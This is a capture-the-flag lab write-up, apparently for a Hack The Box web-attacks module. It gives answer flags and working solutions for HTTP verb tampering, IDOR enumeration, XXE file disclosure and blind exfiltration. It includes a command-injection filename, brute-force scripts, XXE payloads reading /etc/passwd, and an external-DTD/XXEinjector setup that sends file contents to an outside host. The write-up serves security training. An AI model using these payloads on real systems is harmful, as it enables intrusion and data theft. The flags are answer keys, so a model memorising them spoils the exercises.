## HTTP Verb Tampering
### Bypassing Basic Authentication
#### Challenges
1. Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.

    We can solve this by changing the request header from **GET** to **PUT**. The answer is `HTB{4lw4y5_c0v3r_4ll_v3rb5}`.

### Bypassing Security Filters
#### Challenges
1. To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./

    To solve this, we need to change the endpoint to `/index.php` and use **POST** as the HTTP Verb. We can click **change request method** to **POST**. Here the request looks like:

    ![alt text](<Assets/Bypassing Security Filters - 1.png>)

    The answer is `HTB{b3_v3rb_c0n51573n7}`.

## Insecure Direct Object References (IDOR)
### Mass IDOR Enumeration
#### Challenges
1. Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.

    We will see this when we inspect the website:

    ![alt text](<Assets/Mass IDOR Enumeration - 1.png>)

    This means that documents.php expects uid via POST. We can make script to automate download the file.

    ```bash
    #!/bin/bash

    url="http://94.237.120.74:55080"

    for i in {1..20}; do
        echo "[*] UID=$i"
        curl -s -X POST -d "uid=$i" "$url/documents.php" \
        | grep -oP "/documents/[^'\"]+\.(pdf|txt)" \
        | while read -r file; do
            echo "    [+] Downloading $file"
            wget -nc "$url$file"
        done
    done
    ```
    The answer is `HTB{4ll_f1l35_4r3_m1n3}`.

### Bypassing Encoded References
#### Challenges
1. Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.

    When we inspect the **/contract.php** endpoint we will get the logic of how the contract value is generated.

    ![alt text](<Assets/Bypassing Encoded References - 1.png>)

    Based on that, the contract value is generated by taking the uid and encoding it with base64. We can make script to automate download the file.

    ```bash
    #!/bin/bash

    url="http://94.237.120.74:39625"

    for i in {1..20}; do
        contract=$(echo -n "$i" | base64 -w 0)
        echo "[*] UID=$i → contract=$contract"
        wget -nc "$url/download.php?contract=$contract"
    done
    ```

    Then, we can use this script to find the flag:

    ```bash
    #!/bin/bash

    for f in download.php\?contract=*; do
        strings "$f" | grep -iE "HTB\{|flag"
    done
    ```
    The answer is `HTB{h45h1n6_1d5_w0n7_570p_m3}`.

### IDOR in Insecure APIs
#### Challenges
1. Try to read the details of the user with 'uid=5'. What is their 'uuid' value?

    After doing some exploration, we can solve this by intercepting the request of **/profile/index.php** endpoint with Burp Suite. We can change the header to **GET** by clicking **change request method** to **GET**. Then, we need to change the endpoint from **/profile/api.php/profile/1** to **/profile/api.php/profile/5**. It will look like this:

    ![alt text](<Assets/IDOR in Insecure APIs - 1.png>)

    The answer is `eb4fe264c10eb7a528b047aa983a4829`.

### Chaining IDOR Vulnerabilities
#### Challenges
1. Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.

    We can solve this with several steps:
    1. Find valid admin role via IDOR in Insecure APIs (Brute Force the uid to find the admin role).
        
        We can use this script from seclists:

        ```txt
        /usr/share/seclists/Fuzzing/3-digits-000-999.txt
        ```
        We need to intercept the request of **/profile/index.php** endpoint with Burp Suite. After that, change the header to **GET** by clicking **change request method** to **GET**. Then send it to intruder to find the valid admin role.

        ![alt text](<Assets/Chaining IDOR Vulnerabilities - 1.png>)

        We can see that the valid admin role is **staff_admin**.

    2. Update the admin's email to 'flag@idor.htb'.

        In the step 1, we have found the valid admin role with the information of its account. We can use it to update the admin's email to 'flag@idor.htb'.

        ![alt text](<Assets/Chaining IDOR Vulnerabilities - 2.png>)

    3. Refresh **/profile/index.php** to get the flag.

        We can see the flag in the page. The answer is `HTB{1_4m_4n_1d0r_m4573r}`.

    
## XML External Entity (XXE) Injection
### Local File Disclosure
#### Challenges
1. Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.

    We can solve this by using XXE Injection. We can use the following payload:

    ```xml
    <!DOCTYPE email [
    <!ENTITY exploit SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
    ]>
    ```
    This payload will read the content of the 'connection.php' file and encode it with base64. We also need to add **exploit** entity to the displayed field.

    ![alt text](<Assets/Local File Disclosure - 1.png>)

    The answer is `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`.

### Advanced File Disclosure
#### Challenges
1. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').

    In this challenge, i have solved it with CDATA method. First, we need to modify the XML request with the following content:

    ```xml
    <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///flag.php">
    <!ENTITY % end "]]>"> 
    <!ENTITY % xxe SYSTEM "http://10.10.14.101:8000/xxe.dtd"> 
    %xxe;
    ]>
    ...
    <email>&joined;</email>
    ...
    ```
    We need to create an external DTD file named xxe.dtd. This file is necessary because XML rules forbid combining the CDATA tags and the file content directly in the main request.

    ```xml
    <!ENTITY joined "%begin;%file;%end;">
    ```
    Aftter that, we need to host xxe.dtd file on our local machine. We can use python  to host it.

    ```bash
    python3 -m http.server 8000
    ```
    ![alt text](<Assets/Advanced File Disclosure - 1.png>)
    
    The answer is `HTB{3rr0r5_c4n_l34k_d474}`.

### Blind Data Exfiltration
#### Challenges
1. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.

    We can solve this with OOB Exfiltration method. In here, i solved it with XXEinjector tool. By using this tool, we need to get the request of **/blind** endpoint with Burp Suite. We dont need to include the full XML data. We only need the first line of XML data following with **XXEINJECT** on it. It will look like this:

    ```txt
    POST /blind/submitDetails.php HTTP/1.1
    Host: 10.129.234.170
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://10.129.234.170/blind/
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 139
    Origin: http://10.129.234.170
    DNT: 1
    Connection: keep-alive
    Priority: u=0

    <?xml version="1.0" encoding="UTF-8"?>
    XXEINJECT
    ```
    Once we save the request, we can use XXEinjector tool.

    ```bash
    xxeinjector --host=10.10.14.101 --httpport=8000 --file=/tmp/xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
    ```
    We can find the result in the Log folder. The answer is `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`.


## Skills Assessment
1. Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.

    After doing some exploration, i discover some informations in the different endpoints.

    1. **/profile.php** endpoint
    
        Here the request and response in this endpoint looks like:

        ![alt text](<Assets/Skills Assessment - 1.png>)

        We can see that we can get the user full name and the company by changing the uid in the request.
    
    2. **/api.php/token/<id>** endpoint

        Here the request and response in this endpoint looks like:

        ![alt text](<Assets/Skills Assessment - 2.png>)

        We can get the token of the other user by change the id to the apopriate user id. This is **IDOR** vuln. An Insecure Direct Object Reference (IDOR) occurs when an application exposes a reference to an internal object (like a file, database record, or user account) and fails to verify that the user requesting it is actually authorized to access it.
    
    3. **/reset.php** endpoint

        Here the request and response in this endpoint looks like:

        ![alt text](<Assets/Skills Assessment - 3.png>)

        We need **token** and **uid** to reset the user password. We can get both of this by using previous endpoint.

    Based on the information, here the steps to exploit:

    1. Bruteforce the **uid** to find the admin uid

        We can use this script to find it.

        ```python
        import requests
        import json

        # Target Configuration
        TARGET_URL = "http://94.237.63.176:32089"
        START_UID = 1
        END_UID = 100  

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
        }

        # Session cookies (Use your current valid session)
        cookies = {
            "PHPSESSID": "0aqqq0b5hek2lihb75o432prab", # Replace with your active session ID if it expires
            "uid": "74" 
        }

        def find_admin():
            print(f"[*] Starting brute-force on {TARGET_URL}/api.php/user/")
            
            for uid in range(START_UID, END_UID + 1):
                try:
                    # Request the user profile API endpoint
                    response = requests.get(f"{TARGET_URL}/api.php/user/{uid}", headers=headers, cookies=cookies)
                    
                    # Check if the request was successful
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            name = data.get("full_name", "Unknown")
                            company = data.get("company", "Unknown")
                            
                            print(f"[+] UID {uid}: {name} ({company})")
                            
                            full_data = (name + company).lower()

                            if "admin" in full_data or "administrator" in full_data:
                                print(f"\n[!!!] ADMIN FOUND: UID {uid} [!!!]")
                                print(f"Details: {json.dumps(data, indent=2)}\n")
                                return uid
                                
                        except json.JSONDecodeError:
                            pass
                    else:
                        pass

                except Exception as e:
                    print(f"[!] Error on UID {uid}: {e}")

            print("[*] Scan complete.")
            return None

        if __name__ == "__main__":
            find_admin()
        ```
        ![alt text](<Assets/Skills Assessment - 4.png>)

        We can see that the uid of the admin is **52**.

    2. Steal the **token** of the admin

        We can use **/api.php/token/52** endpoint to get the token.

        ![alt text](<Assets/Skills Assessment - 5.png>)

        ```txt
        e51a85fa-17ac-11ec-8e51-e78234eb7b0c
        ```
    
    3. **Reset** admin password

        Once we have the uid and the token of the admin, we can use **/reset.php** to reset the admin password. But something wrong, we get **Denined Access** when we tried to change the password even we have the valid uid and token. After doing some exploration, we need to change the method by clicking **change request method** to **GET**. This mean, it has **HTTP Verb Tampering** vuln.

        ![alt text](<Assets/Skills Assessment - 6.png>)

        Then, we can relogin by admin credential. We will get new endpoint, **/addEvent.php**. It send XML request and display the value of **<name>** tag. It has high probabilty of **XXE** vuln.

        ![alt text](<Assets/Skills Assessment - 7.png>)

    4. Exploit **/addEvent.php** endpoint by using **XXE**

        I tried to test it by using basic payload of XXE.

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>
        <name>&xxe;</name>
        <details>def</details>
        <date>2026-01-05</date>
        </root>
        ```
        ![alt text](<Assets/Skills Assessment - 8.png>)

        We can see the payload is working. We can use this payload to read the flag:

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=///flag.php">
        ]>
        <root>
        <name>&xxe;</name>
        <details>def</details>
        <date>2026-01-05</date>
        </root>
        ```
        The answer is `HTB{m4573r_w3b_4774ck3r}`.
